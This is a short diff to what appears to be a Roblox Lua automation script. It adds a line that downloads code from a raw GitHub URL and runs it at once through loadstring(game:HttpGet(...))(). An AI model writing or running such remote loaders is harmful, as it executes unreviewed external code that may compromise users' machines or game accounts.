@@ -502,4 +502,4 @@ end
 executeAutoMenu()
 
 -- Load external script with specific URL
-loadstring(game:HttpGet("123"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/main2/refs/heads/main/2"))()
